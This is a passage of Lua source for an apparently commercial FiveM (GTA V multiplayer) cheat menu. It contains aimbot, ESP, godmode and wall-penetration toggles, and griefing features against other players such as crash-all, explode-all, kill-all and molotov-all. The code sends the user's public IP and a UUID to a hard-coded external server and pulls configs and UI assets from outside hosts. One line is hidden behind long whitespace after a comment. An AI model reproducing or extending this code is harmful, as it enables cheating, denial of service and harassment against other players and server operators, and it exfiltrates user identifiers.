                strf = str_to_bool(mysplit(getCheck, " ")[95]),
                tlpzmb = str_to_bool(mysplit(getCheck, " ")[96]),
                autfrmxp = str_to_bool(mysplit(getCheck, " ")[97]),
                autfrm = str_to_bool(mysplit(getCheck, " ")[98]),
                rmvwindows = str_to_bool(mysplit(getCheck, " ")[99]),
                wrpthevehicle = str_to_bool(mysplit(getCheck, " ")[100]),
                frrzmo = str_to_bool(mysplit(getCheck, " ")[101]),
            }
            ZM_M1000.Draw = true
        end
        if selectconfig5 then
            getCheck = redENGINE.Request:Get("http://37.187.39.183/configzm/"..location5, {field = "data"})
            ZM_M1000 = {
                np = str_to_bool(mysplit(getCheck, " ")[1]),
                gd = str_to_bool(mysplit(getCheck, " ")[2]),
                ivs = str_to_bool(mysplit(getCheck, " ")[3]),
                fst = str_to_bool(mysplit(getCheck, " ")[4]),
                stmn = str_to_bool(mysplit(getCheck, " ")[5]),
                ncl = str_to_bool(mysplit(getCheck, " ")[6]),
                authl = str_to_bool(mysplit(getCheck, " ")[7]),
                fkd = str_to_bool(mysplit(getCheck, " ")[8]),
                fstswin = str_to_bool(mysplit(getCheck, " ")[9]),
                opplayer = str_to_bool(mysplit(getCheck, " ")[10]),
                rollinfinity = str_to_bool(mysplit(getCheck, " ")[11]),
                nrgl = str_to_bool(mysplit(getCheck, " ")[12]),
                jp = str_to_bool(mysplit(getCheck, " ")[13]),
                fcra = str_to_bool(mysplit(getCheck, " ")[14]),
                boxes = str_to_bool(mysplit(getCheck, " ")[15]),
                skelt = str_to_bool(mysplit(getCheck, " ")[16]),
                plname = str_to_bool(mysplit(getCheck, " ")[17]),
                tvision = str_to_bool(mysplit(getCheck, " ")[18]),
                nivision = str_to_bool(mysplit(getCheck, " ")[19]),
                wcolor = str_to_bool(mysplit(getCheck, " ")[20]),
                line = str_to_bool(mysplit(getCheck, " ")[21]),
                bllplp = str_to_bool(mysplit(getCheck, " ")[22]),
                nwater = str_to_bool(mysplit(getCheck, " ")[23]),
                nprops = str_to_bool(mysplit(getCheck, " ")[24]),
                hbar = str_to_bool(mysplit(getCheck, " ")[25]),
                abar = str_to_bool(mysplit(getCheck, " ")[26]),
                rmvfog = str_to_bool(mysplit(getCheck, " ")[27]),
                chair = str_to_bool(mysplit(getCheck, " ")[28]),
                blps = str_to_bool(mysplit(getCheck, " ")[29]),
                eweapon = str_to_bool(mysplit(getCheck, " ")[30]),
                cnight = str_to_bool(mysplit(getCheck, " ")[31]),
                icnself = str_to_bool(mysplit(getCheck, " ")[32]),
                icnpeds = str_to_bool(mysplit(getCheck, " ")[33]),
                flbox = str_to_bool(mysplit(getCheck, " ")[34]),
                speammo = str_to_bool(mysplit(getCheck, " ")[35]),
                tgdead = str_to_bool(mysplit(getCheck, " ")[36]),
                tgped = str_to_bool(mysplit(getCheck, " ")[37]),
                pwall = str_to_bool(mysplit(getCheck, " ")[38]),
                aimbot = str_to_bool(mysplit(getCheck, " ")[39]),
                amlck = str_to_bool(mysplit(getCheck, " ")[40]),
                infiniammo = str_to_bool(mysplit(getCheck, " ")[41]),
                rpdfire = str_to_bool(mysplit(getCheck, " ")[42]),
                nospread = str_to_bool(mysplit(getCheck, " ")[43]),
                shootp = str_to_bool(mysplit(getCheck, " ")[44]),
                ptfxbullet = str_to_bool(mysplit(getCheck, " ")[45]),
                drawbullet = str_to_bool(mysplit(getCheck, " ")[46]),
                antihd = str_to_bool(mysplit(getCheck, " ")[47]),
                hitmarker = str_to_bool(mysplit(getCheck, " ")[48]),
                fov = str_to_bool(mysplit(getCheck, " ")[49]),
                fillfov = str_to_bool(mysplit(getCheck, " ")[50]),
                head = str_to_bool(mysplit(getCheck, " ")[51]),
                shoulder = str_to_bool(mysplit(getCheck, " ")[52]),
                shoulder2 = str_to_bool(mysplit(getCheck, " ")[53]),
                pelvis = str_to_bool(mysplit(getCheck, " ")[54]),
                feet = str_to_bool(mysplit(getCheck, " ")[55]),
                feet2 = str_to_bool(mysplit(getCheck, " ")[56]),
                kneel = str_to_bool(mysplit(getCheck, " ")[57]),
                kneer = str_to_bool(mysplit(getCheck, " ")[58]),
                vbrajke = str_to_bool(mysplit(getCheck, " ")[59]),
                vinvisible = str_to_bool(mysplit(getCheck, " ")[60]),
                vdrift = str_to_bool(mysplit(getCheck, " ")[61]),
                vboost = str_to_bool(mysplit(getCheck, " ")[62]),
                vjump = str_to_bool(mysplit(getCheck, " ")[63]),
                handling = str_to_bool(mysplit(getCheck, " ")[64]),
                autrepair = str_to_bool(mysplit(getCheck, " ")[65]),
                vnitro = str_to_bool(mysplit(getCheck, " ")[66]),
                rcar = str_to_bool(mysplit(getCheck, " ")[67]),
                vcol = str_to_bool(mysplit(getCheck, " ")[68]),
                spawninside = str_to_bool(mysplit(getCheck, " ")[69]),
                spec = str_to_bool(mysplit(getCheck, " ")[70]),
                fdplayer = str_to_bool(mysplit(getCheck, " ")[71]),
                mtvplayer = str_to_bool(mysplit(getCheck, " ")[72]),
                tzplayer = str_to_bool(mysplit(getCheck, " ")[73]),
                hyplayer = str_to_bool(mysplit(getCheck, " ")[74]),
                killplayerrr = str_to_bool(mysplit(getCheck, " ")[75]),
                cgplayerm100teb = str_to_bool(mysplit(getCheck, " ")[76]),
                spermecar = str_to_bool(mysplit(getCheck, " ")[77]),
                launchplayer = str_to_bool(mysplit(getCheck, " ")[78]),
                cgplayer = str_to_bool(mysplit(getCheck, " ")[79]),
                crashplayer = str_to_bool(mysplit(getCheck, " ")[80]),
                ptfxspamming = str_to_bool(mysplit(getCheck, " ")[81]),
                waterplayer = str_to_bool(mysplit(getCheck, " ")[82]),
                molotovallp = str_to_bool(mysplit(getCheck, " ")[83]),
                whaleplayer = str_to_bool(mysplit(getCheck, " ")[84]),
                destroycars = str_to_bool(mysplit(getCheck, " ")[85]),
                asas = str_to_bool(mysplit(getCheck, " ")[86]),
                musicclip = str_to_bool(mysplit(getCheck, " ")[87]),
                rnhud = str_to_bool(mysplit(getCheck, " ")[88]),
                atznshot = str_to_bool(mysplit(getCheck, " ")[89]),
                stmnshot = str_to_bool(mysplit(getCheck, " ")[90]),
                tlportovehicle = str_to_bool(mysplit(getCheck, " ")[91]),
                gmdglife = str_to_bool(mysplit(getCheck, " ")[92]),
                infammo = str_to_bool(mysplit(getCheck, " ")[93]),
                espltbag = str_to_bool(mysplit(getCheck, " ")[94]),
                strf = str_to_bool(mysplit(getCheck, " ")[95]),
                tlpzmb = str_to_bool(mysplit(getCheck, " ")[96]),
                autfrmxp = str_to_bool(mysplit(getCheck, " ")[97]),
                autfrm = str_to_bool(mysplit(getCheck, " ")[98]),
                rmvwindows = str_to_bool(mysplit(getCheck, " ")[99]),
                wrpthevehicle = str_to_bool(mysplit(getCheck, " ")[100]),
                frrzmo = str_to_bool(mysplit(getCheck, " ")[101]),
            }
            ZM_M1000.Draw = true
        end


    end
end)

function str_to_bool(str)
    if str == nil then
        return false
    end
    return string.lower(str) == 'true'
end

-- Citizen.CreateThread(function()
--     while true do
--         Wait(0)
--         print(bite)
--     end
-- end)


ZM_M1000 = {
    np = false,
    gd = false,
    ivs = false,
    fst = false,
    stmn = false,
    ncl = false,
    authl = false,
    fkd = false,
    fstswin = false,
    opplayer = false,
    rollinfinity = false,
    nrgl = false,
    jp = false,
    fcra = false,
    boxes = false,
    skelt = false,
    plname = false,
    tvision = false,
    nivision = false,
    wcolor = false,
    line = false,
    bllplp = false,
    nwater = false,
    nprops = false,
    hbar = false,
    abar = false,
    rmvfog = false,
    chair = false,
    blps = false,
    eweapon = false,
    cnight = false,
    icnself = true,
    icnpeds = false,
    flbox = true,
    speammo = false,
    tgdead = false,
    tgped = false,
    pwall = false,
    aimbot = false,
    amlck = false,
    infiniammo = false,
    rpdfire = false,
    nospread = false,
    shootp = false,
    ptfxbullet = false,
    drawbullet = false,
    antihd = false,
    hitmarker = false,
    fov = false,
    fillfov = false,
    head = true,
    shoulder = false,
    shoulder2 = false,
    pelvis = false,
    feet = false,
    feet2 = false,
    kneel = false,
    kneer = false,
    vbrajke = false,
    vinvisible = false,
    vdrift = false,
    vboost = false,
    vjump = false,
    handling = false,
    autrepair = false,
    vnitro = false,
    rcar = false,
    vcol = false,
    spawninside = false,
    spec = false,
    fdplayer = false,
    mtvplayer = false,
    tzplayer = false,
    hyplayer = false,
    killplayerrr = false,
    cgplayerm100teb = false,
    spermecar = false,
    launchplayer = false,
    cgplayer = false,
    crashplayer = false,
    ptfxspamming = false,
    waterplayer = false,
    molotovallp = false,
    whaleplayer = false,
    destroycars = false,
    asas = false,
    musicclip = false,
    rnhud = false,
    atznshot = false,
    stmnshot = false,
    tlportovehicle = false,
    gmdglife = false,
    infammo = false,
    espltbag = false,
    strf = false,
    tlpzmb = false,
    autfrmxp = false,
    autfrm = false,
    rmvwindows = false,
    wrpthevehicle = false,
    frrzmo = false,
}


    local weapons = {"WEAPON_KNIFE","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE", "WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_POOLCUE","WEAPON_PIPEWRENCH","WEAPON_PISTOL","WEAPON_PISTOL_MK2","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_REVOLVER", "WEAPON_REVOLVER_MK2","WEAPON_DOUBLEACTION","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_SNSPISTOL_MK2","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_MICROSMG","WEAPON_MINISMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_MACHINEPISTOL","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE", "WEAPON_SPECIALCARBINE_MK2","WEAPON_BULLPUPRIFLE","WEAPON_BULLPUPRIFLE_MK2","WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN","WEAPON_PUMPSHOTGUN_MK2","WEAPON_SWEEPERSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_MARKSMANRIFLE_MK2","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_MINIGUN","WEAPON_FIREWORK","WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER","WEAPON_COMPACTLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}

    local weaponTable2 = {
            {name = "weapon_pistol", button = "Pistol"},
            {name = "weapon_pistol_mk2", button = "Pistol MK2"},
            {name = "weapon_combatpistol", button = "Combat Pistol"},
            {name = "weapon_snspistol", button = "SNS Pistol"},
            {name = "weapon_snspistol_mk2", button = "SNS Pistol MK2"},
            {name = "weapon_vintagepistol", button = "Vintage Pistol"},
            {name = "weapon_appistol", button = "AP Pistol"},
            {name = "weapon_stungun", button = "Stun Gun"},
            {name = "weapon_pistol50", button = "Pistol 50"},
            {name = "weapon_revolver_mk2", button = "Revolver MK2"},
            {name = "weapon_marksmanpistol", button = "Marksman Pistol"},
            {name = "weapon_ceramicpistol", button = "Ceramic Pistol"},
            {name = "weapon_raypistol", button = "Ray Pistol"},
            {name = "weapon_doubleaction", button = "Double Action"},
            {name = "weapon_navyrevolver", button = "Navy Revolver"},
            {name = "weapon_gadgetpistol", button = "Gadget Pistol"},
            {name = "weapon_heavypistol", button = "Heavy Pistol"},
            {name = "weapon_carbine", button = "Carabine"},
            {name = "weapon_dagger", button = "Dagger"},
            {name = "weapon_bat", button = "Bat"},
            {name = "weapon_bottle", button = "Bottle"},
            {name = "weapon_flashlight", button = "Flashlight"},
            {name = "weapon_golfclub", button = "Golfclub"},
            {name = "weapon_hammer", button = "Hammer"},
            {name = "weapon_hatchet", button = "Hatchet"},
            {name = "weapon_knuckle", button = "Knuckle"},
            {name = "weapon_knife", button = "Knife"},
            {name = "weapon_machete", button = "Machette"},
            {name = "weapon_switchblade", button = "Switchblade"},
            {name = "weapon_nightstick", button = "Nightstick"},
            {name = "weapon_wrench", button = "Wrench"},
            {name = "weapon_battleaxe", button = "Battleaxe"},
            {name = "weapon_poolcue", button = "Poolcue"},
            {name = "weapon_stone_hatchet", button = "Hatchet Stone"},
            {name = "weapon_assaultrifle", button = "Assault Rifle"},
            {name = "weapon_assaultrifle_mk2", button = "Assault Rifle MK2"},
            {name = "weapon_carbinerifle", button = "Carbine Rifle"},
            {name = "weapon_carbinerifle_mk2", button = "Carbine Rifle MK2"},
            {name = "weapon_advancedrifle", button = "Advanced Rifle"},
            {name = "weapon_specialcarbine", button = "Special Carbine"},
            {name = "weapon_specialcarbine_mk2", button = "Special Carbine MK2"},
            {name = "weapon_bullpuprifle", button = "Bullpup Rifle"},
            {name = "weapon_compactrifle", button = "Compact Rifle"},
            {name = "weapon_gusenberg", button = "Gusenberg"},
            {name = "weapon_smg", button = "SMG"},
            {name = "weapon_microsmg", button = "Micro SMG"},
            {name = "weapon_smg_mk2", button = "Smg MK2"},
            {name = "weapon_assaultsmg", button = "Assault SMG"},
            {name = "weapon_combatpdw", button = "Combat PDW"},
            {name = "weapon_machinepistol", button = "Machine Pistol"},
            {name = "weapon_minismg", button = "Mini SMG"},
            {name = "weapon_rpg", button = "RPG"},
            {name = "weapon_grenadelauncher", button = "Grenade Launcher"},
            {name = "weapon_grenadelauncher_smoke", button = "Grenade Launcher S"},
            {name = "weapon_minigun", button = "Minigun"},
            {name = "weapon_firework", button = "Firework"},
            {name = "weapon_railgun", button = "Railgun"},
            {name = "weapon_hominglauncher", button = "Homing Launcher"},
            {name = "weapon_compactlauncher", button = "Compact Launcher"},
            {name = "weapon_rayminigun", button = "Rayminigun"},
            {name = "weapon_sniperrifle", button = "Sniper Rifle"},
            {name = "weapon_heavysniper", button = "Heavy Sniper"},
            {name = "weapon_heavysniper_mk2", button = "Heavy Sniper MK2"},
            {name = "weapon_marksmanrifle", button = "Marksmanrifle"},
            {name = "weapon_marksmanrifle_mk2", button = "Marksmanrifle MK2"},

    }

    local randomProps = {
        "prop_ballistic_shield_lod1",
        "prop_cs_burger_01",
        "prop_telescope",
        "v_res_r_cottonbuds",
        "prop_beer_bison",
        "prop_ld_bingbag_03",
        "prop_ld_bingbag_04",
        "xm_mpchristmasadditions_hatch_10",
        "dt1_11_slod1",
        "cfindFile_10_cablebld_d",
        "cfindFile_09_sea_ufo",
        "dt1_rd1_r5h_slod1",
        "id2_lod_slod4",
        "prop_cigar_02"
    }


    local ZM_KeyboardUI = {}

    ZM_KeyboardUI.resX, ZM_KeyboardUI.resY = GetActiveScreenResolution()
    ZM_KeyboardUI.Thread = CreateThread
    ZM_KeyboardUI.ActiveMenu = 'Main Menu'
    ZM_KeyboardUI.MenuOpen = true
    ZM_KeyboardUI.MenuToggle = true
    ZM_KeyboardUI.Checkbox = {}
    CIT = Citizen


    local KeyboardInput = function(text, example, maxstr)
        AddTextEntry("FMMC_KEY_TIP1", text .. ":")
        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", example, "", "", "", maxstr)
        while UpdateOnscreenKeyboard() == 0 do

            if keyboardmenu then
                ZM_KeyboardUI.Open = false
            end
            DisableAllControlActions(0)
            if IsDisabledControlPressed(0, 322) then
                return
            end
            Wait(0)
        end
        if GetOnscreenKeyboardResult() then
            local result = GetOnscreenKeyboardResult()

            if keyboardmenu then
                ZM_KeyboardUI.Open = true
            end
            if result then
                return result
            end
        end
    end

    local function spawn(b)
        local c = Winnie_PlayerPedId()
        local d = Winnie_GetHashKey(tostring(b))
        Winnie_RequestModel(d)
        while not Winnie_HasModelLoaded(d) do
            Wait(0)
        end
        local e = table.unpack(Winnie_GetEntityCoords(c))
        local f = Winnie_CreateVehicle(d, Winnie_GetEntityCoords(c), true, true)
        if ZM_M1000.spawninside then
            Winnie_SetPedIntoVehicle(c, f, -1)
        end
    end
    local function spawn2(b)
        local c = Winnie_PlayerPedId()
        local d = Winnie_GetHashKey(tostring(b))
        Winnie_RequestModel(d)
        while not Winnie_HasModelLoaded(d) do
            Wait(0)
        end
        local e = table.unpack(Winnie_GetEntityCoords(c))
        local f = Winnie_CreateVehicle(d, Winnie_GetEntityCoords(c), true, true)
        if ZM_KeyboardUI.Checkbox["spawninside-function"] then
            Winnie_SetPedIntoVehicle(c, f, -1)
        end
    end

    CIT.CreateThread(function()
        while New.active do




        if GetEntitySpeed(PlayerPedId()) <= 0.5 and not IsPedRunning(PlayerPedId()) and not IsPedWalking(PlayerPedId()) and not IsPedShooting(PlayerPedId()) and not IsPedTryingToEnterALockedVehicle(PlayerPedId()) and not IsPedDucking(PlayerPedId()) then
            if externalmenu then

                local url = "http://37.187.39.183:3001/Zm-Menu/search"

                local wlIP = "http://api.ipify.org"
                local ip = redENGINE.Request:Get(wlIP, {field = "data"});

                local result = redENGINE.Request:Post(url, {uuid = UUID, ip = ip})



                booleanCheck = {
                                healslider = mysplit(result, " ")[1],
                                armorslider = mysplit(result, " ")[2],
                                 revive = mysplit(result, " ")[3],
                                suicide = mysplit(result, " ")[4],
                                outfit = mysplit(result, " ")[5],
                                tpwaypoint = mysplit(result, " ")[6],
                                cleartask = mysplit(result, " ")[7],
                                noclip = mysplit(result, " ")[8],
                                godmode = mysplit(result, " ")[9],
                                invisible = mysplit(result, " ")[10],
                                fastrun = mysplit(result, " ")[11],
                                stamina = mysplit(result, " ")[12],
                                autoheal = mysplit(result, " ")[13],
                                fastswim = mysplit(result, " ")[14],
                                rollinfinity = mysplit(result, " ")[15],
                                noradoll = mysplit(result, " ")[16],
                                jump = mysplit(result, " ")[17],
                                freecam = mysplit(result, " ")[18],
                                freecamfovslider = mysplit(result, " ")[19],
                                freecamspeedslider = mysplit(result, " ")[20],
                                freecamsensislider = mysplit(result, " ")[21],
                                opacityplayerslider = mysplit(result, " ")[22],
                                boxes = mysplit(result, " ")[23],
                                skeleton = mysplit(result, " ")[24],
                                thermalvision = mysplit(result, " ")[25],
                                nightvision = mysplit(result, " ")[26],
                                line = mysplit(result, " ")[27],
                                blips = mysplit(result, " ")[28],
                                nowater = mysplit(result, " ")[29],
                                noprops = mysplit(result, " ")[30],
                                healbar = mysplit(result, " ")[31],
                                armorbar = mysplit(result, " ")[32],
                                removefog = mysplit(result, " ")[33],
                                crosshair = mysplit(result, " ")[34],
                                clearnight = mysplit(result, " ")[35],
                                includeself = mysplit(result, " ")[36],
                                includeplayers = mysplit(result, " ")[37],
                                fillbox = mysplit(result, " ")[38],
                                colorrslider = mysplit(result, " ")[39],
                                colorgslider = mysplit(result, " ")[40],
                                colorbslider = mysplit(result, " ")[41],
                                opcacityfillboxslider = mysplit(result, " ")[42],
                                distanceespslider = mysplit(result, " ")[43],
                                giveall = mysplit(result, " ")[44],
                                removeall = mysplit(result, " ")[45],
                                givespecific = mysplit(result, " ")[46],
                                removespecific = mysplit(result, " ")[47],
                                maxammo = mysplit(result, " ")[48],
                                removeammo = mysplit(result, " ")[49],
                                silentaim = mysplit(result, " ")[50],
                                aimlock = mysplit(result, " ")[51],
                                ammoilimited = mysplit(result, " ")[52],
                                rapidefire = mysplit(result, " ")[53],
                                nospread = mysplit(result, " ")[54],
                                shootteleport = mysplit(result, " ")[55],
                                ptfxbullet = mysplit(result, " ")[56],
                                shootvehicle = mysplit(result, " ")[57],
                                antiheadshot = mysplit(result, " ")[58],
                                hitsound = mysplit(result, " ")[59],
                                fov = mysplit(result, " ")[60],
                                fillfov = mysplit(result, " ")[61],
                                fovaimbot = mysplit(result, " ")[62],
                                targetdead = mysplit(result, " ")[63],
                                targetped = mysplit(result, " ")[64],
                                ptfxscale = mysplit(result, " ")[65],
                                penetratewall = mysplit(result, " ")[66],
                                distanceaimbot = mysplit(result, " ")[67],
                                spwanvehicle = mysplit(result, " ")[68],
                                changeplate = mysplit(result, " ")[69],
                                repairvehicle = mysplit(result, " ")[70],
                                deletevehicle = mysplit(result, " ")[71],
                                vehiclemaximum = mysplit(result, " ")[72],
                                teleportnearestvehicle = mysplit(result, " ")[73],
                                cleanvehicle = mysplit(result, " ")[74],
                                refuelvehicle = mysplit(result, " ")[75],
                                refueloil = mysplit(result, " ")[76],
                                openalldoors = mysplit(result, " ")[77],
                                closealldoors = mysplit(result, " ")[78],
                                instantbrake = mysplit(result, " ")[79],
                                invisibleveh = mysplit(result, " ")[80],
                                drift = mysplit(result, " ")[81],
                                boost = mysplit(result, " ")[82],
                                jumpvehicle = mysplit(result, " ")[83],
                                handling = mysplit(result, " ")[84],
                                autorepair = mysplit(result, " ")[85],
                                nitro = mysplit(result, " ")[86],
                                rainbowcar = mysplit(result, " ")[87],
                                vehiclecolor = mysplit(result, " ")[88],
                                spawninside = mysplit(result, " ")[89],
                                colorrvehicle = mysplit(result, " ")[90],
                                colorgvehicle = mysplit(result, " ")[91],
                                colorbvehicle = mysplit(result, " ")[92],
                                vehiclespeedboost = mysplit(result, " ")[93],
                                killall = mysplit(result, " ")[94],
                                explodeall = mysplit(result, " ")[95],
                                spawnmass = mysplit(result, " ")[96],
                                kickallvehicle = mysplit(result, " ")[97],
                                terroristattack = mysplit(result, " ")[98],
                                giveweaponall = mysplit(result, " ")[99],
                                removeweaponall = mysplit(result, " ")[100],
                                spawntransexual = mysplit(result, " ")[101],
                                randompeds = mysplit(result, " ")[102],
                                randomprops = mysplit(result, " ")[103],
                                clearpedtask = mysplit(result, " ")[104],
                                unlockvehicle = mysplit(result, " ")[105],
                                earrape = mysplit(result, " ")[106],
                                cageallplayers = mysplit(result, " ")[107],
                                crashallplayers = mysplit(result, " ")[108],
                                ptfxspamming = mysplit(result, " ")[109],
                                hyrantallplayers = mysplit(result, " ")[110],
                                molotovallplayers = mysplit(result, " ")[111],
                                whalemasspawn = mysplit(result, " ")[112],
                                explodevehicles = mysplit(result, " ")[113],
                                flyallvehicles = mysplit(result, " ")[114],
                                explodetype = mysplit(result, " ")[115],
                                ptfxscl = mysplit(result, " ")[116],
                                forcefly = mysplit(result, " ")[117],
                                closemenu = mysplit(result, " ")[118],
                                paniccrash = mysplit(result, " ")[119],
                                reportbug = mysplit(result, " ")[120],
                                antizinshot = mysplit(result, " ")[121],
                                staminashot = mysplit(result, " ")[122],
                                teleporttovehicle = mysplit(result, " ")[123],
                                godmodeglife = mysplit(result, " ")[124],
                                infiniteammo = mysplit(result, " ")[125],
                                esplootbag = mysplit(result, " ")[126],
                                assistantstafe = mysplit(result, " ")[127],
                                teleportzombie = mysplit(result, " ")[128],
                                autofarmxp = mysplit(result, " ")[129],
                                autofarm = mysplit(result, " ")[130],
                                removewindows = mysplit(result, " ")[131],
                                warpvehicle = mysplit(result, " ")[132],
                                freezeammo = mysplit(result, " ")[133],
                                colorrbag = mysplit(result, " ")[134],
                                colorgbag = mysplit(result, " ")[135],
                                colorbbag = mysplit(result, " ")[136],
                                healglife = mysplit(result, " ")[137],
                                speedstrafe = mysplit(result, " ")[138],
                            }

                            end
                        end
                        Wait(1500)
                    end
                end)

                function textureKeyboard()
                    ZM_KeyboardUI.circle = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/circlecommetrouducu.html", 2000, 2000)
                    ZM_KeyboardUI.mov = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/fov.html?aa", 1940, 1100)
                    ZM_KeyboardUI.banner = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/banner.html?eaaazfzefezfzef5", 2000, 2000)
                    ZM_KeyboardUI.arrow = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/arrow.html?zen", 2000, 2000)
                    ZM_KeyboardUI.circlered = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/circlered.html?zdzdzd", 2000, 2000)
                    ZM_KeyboardUI.circlegreen = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/circlegreen.html?zdzd", 2000, 2000)
                    ZM_KeyboardUI.sepa = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/separator.html", 2000, 2000)

                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("cicrle"),"circleezaaa", Winnie_GetDuiHandle(ZM_KeyboardUI.circle))
                    --Wait(200) --- 2 menu
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("zadzadazdazdazd"),"azdzaedfadaddzadazd", Winnie_GetDuiHandle(ZM_KeyboardUI.mov))
                    --Wait(200) -- 2 menu
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("banner"),"banner1", Winnie_GetDuiHandle(ZM_KeyboardUI.banner))
                    --Wait(200)                                                                                                                                                                                          Winnie_CreateRuntimeTextureFromDuiHandle(CreateRuntimeTxd("banner2"),"banner2", GetDuiHandle(CreateDui("http://zebuloshop.xyz/ImagePng/banner2.html?eaaazfzefezfzef5", 2000, 2000))) -- keyboard
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("arrow"),"arrow2",Winnie_GetDuiHandle(ZM_KeyboardUI.arrow))
                    --Wait(200) -- keyboard
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("circlered"),"circle", Winnie_GetDuiHandle(ZM_KeyboardUI.circlered))
                    --Wait(200)  -- keyboard
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("circlegreen"),"circle", Winnie_GetDuiHandle(ZM_KeyboardUI.circlegreen))
                    --Wait(200) -- keyboard
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("separator"),"seperator2", Winnie_GetDuiHandle(ZM_KeyboardUI.sepa))
                    --Wait(200) -- keyboard
                end

            function textureMouseUI()
                    ZM_M1000.circle = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/circlecommetrouducu.html", 2000, 2000)
                    ZM_M1000.mov = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/fov.html?aa", 1940, 1100)
                    ZM_M1000.uiinutile = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/menutest.html?aaa", 2000, 2000)
                    ZM_M1000.jesaispas = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/choose.html?aaazwwsfsdfsfgwwzzzz", 2000, 2000)
                    ZM_M1000.bhoejesaispas2 = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/cursor.html?aaaaaaa", 1800, 1800) Wait(500)
                    ZM_M1000.winniemonbb = Winnie_CreateDui("https://cdn.discordapp.com/attachments/864491953742938133/938190718273466448/winnie_PD.png", 250, 250)
                    ZM_M1000.sexexe = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/playeraimbot.html?sexeanal", 2000, 2000)
                    ZM_M1000.circlered = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/circlered.html?zdzdzd", 2000, 2000)
                    ZM_M1000.circlegreen = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/circlegreen.html?zdzd", 2000, 2000)
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("cicrle"),"circleezaaa", Winnie_GetDuiHandle(ZM_M1000.circle))
                    --Wait(200) --- 2 menu
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("zadzadazdazdazd"),"azdzaedfadaddzadazd", Winnie_GetDuiHandle(ZM_M1000.mov))
                    --Wait(200) -- 2 menu
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("afzgfrezgergergerg"),"zefhuzeufezufhzeufh", Winnie_GetDuiHandle(ZM_M1000.uiinutile))
                    --Wait(200) -- UI inutile
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("azdfzefrezgfzregfz"),"kofzkofzeokfzeokfkoz", Winnie_GetDuiHandle(ZM_M1000.jesaispas))
                    --Wait(200)
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("zeofkkezofkezofkzeko"),"azzaefzgergzeggez", Winnie_GetDuiHandle(ZM_M1000.bhoejesaispas2))
                    --Wait(200) -- mouseUI
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("pd"),"efafaefaefeazefezaf", Winnie_GetDuiHandle(ZM_M1000.winniemonbb))
                    --Wait(200)  -- mouseUI
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("ezfezafzaefadfafaf"),"ezfezgtrhrthtrhrth", Winnie_GetDuiHandle(ZM_M1000.sexexe))
                    --Wait(200)  -- mouseUI
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("circlered"),"circle", Winnie_GetDuiHandle(ZM_M1000.circlered))
                    --Wait(200)  -- keyboard
